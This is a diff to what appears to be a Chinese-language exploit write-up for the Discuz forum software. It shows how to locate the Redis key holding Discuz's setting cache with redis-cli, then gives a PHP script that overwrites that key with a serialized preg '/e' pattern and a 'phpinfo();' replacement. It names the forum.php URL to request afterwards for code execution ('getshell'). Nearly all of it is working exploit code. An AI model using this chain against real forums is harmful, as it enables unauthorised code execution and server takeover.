@@ -16,3 +16,23 @@ function output_replace($content) {
 $_G['setting']['output']['preg']['search']=”/.*/e”;
 $_G['setting']['output']['preg']['replace']=”phpinfo();”;
 ```
+dz使用redis时，全局变量$_G[‘setting’]放在xxxx_setting中的，其中前缀就是前面config_global.php中的prefix的值.也可以在redis-cli中通过如下命令查看：
+```
+keys *          #查看所有键
+keys *_setting  #模糊查询的方式查找匹配的键
+```
+得到键名后通过以下方式修改本地缓存：
+```
+<?php
+$a['output']['preg']['search']['plugins'] = "/.*/e";
+$a['output']['preg']['replace']['plugins'] = "phpinfo();";
+$a['rewritestatus']['plugins']=1;
+$setting = serialize($a);
+$redis = new Redis();
+$redis->connect('127.0.0.1',6379);
+$redis->set("kQbXlj_setting",$setting);
+```
+复写缓存后访问如下地址就能发现成功getshell:
+```
+/discuz/forum.php?mod=ajax&inajax=yes&action=getthreadtype
+```
